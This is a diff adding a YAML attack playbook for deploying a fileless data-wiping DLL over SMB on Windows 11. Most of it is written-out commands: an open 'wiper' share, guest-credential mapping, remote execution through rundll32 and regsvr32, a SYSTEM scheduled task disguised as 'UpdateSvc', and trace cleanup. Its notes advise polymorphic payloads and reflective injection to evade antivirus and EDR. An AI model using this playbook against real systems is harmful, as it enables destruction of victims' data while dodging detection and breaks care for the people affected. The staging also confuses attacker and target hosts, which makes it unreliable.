@@ -1,0 +1,56 @@
+id: fileless-wiper-killchain
+info:
+  name: Fileless Wiperware Deployment via SMB Share
+  author: Contractor/AP3X
+  description: >
+    Full killchain for deploying a polymorphic, fileless wiper DLL over SMB
+    using Windows native tools and USB network sharing options on Windows 11.
+  mitre_attack:
+    - T1071.002 # Application Layer Protocol: SMB
+    - T1218.010 # Execution via rundll32
+    - T1218.011 # Execution via regsvr32
+    - T1053.005 # Scheduled Task
+    - T1027     # Obfuscated Files/Information
+    - T1070.004 # File Deletion
+    - T1485     # Data Destruction
+    - T1486     # Data Encryption
+
+stages:
+  - name: Payload Hosting
+    description: |
+      Host the fileless wiper DLL on a network share accessible by target.
+    commands:
+      - net share wiper=C:\payloads /grant:Everyone,FULL
+
+  - name: Recon and Share Mapping
+    description: |
+      Enumerate target shares and map the SMB share over USB or local network.
+    commands:
+      - net view \\TARGET_IP
+      - net use \\TARGET_IP\wiper /user:guest ""
+
+  - name: Payload Execution
+    description: |
+      Execute the fileless wiper DLL remotely in memory using rundll32 or regsvr32.
+    commands:
+      - rundll32.exe \\TARGET_IP\wiper\nsfw.dll,EntryPoint
+      - regsvr32 /s /n /u /i:\\TARGET_IP\wiper\nsfw.dll scrobj.dll
+
+  - name: Persistence (Optional)
+    description: |
+      Schedule task to run payload at specified time with SYSTEM privileges.
+    commands:
+      - schtasks /create /tn UpdateSvc /tr "rundll32 \\TARGET_IP\wiper\nsfw.dll,EntryPoint" /sc once /st 00:01 /ru SYSTEM
+
+  - name: Cleanup
+    description: |
+      Remove mapped network shares after execution to remove traces.
+    commands:
+      - net use \\TARGET_IP\wiper /delete /y
+
+notes:
+  - "Ensure that the target has SMB enabled and allows guest access or valid credentials."
+  - "Use encrypted or polymorphic payloads to evade AV/EDR."
+  - "For stealth, leverage syscall-based reflective DLL injection loaders."
+
+```
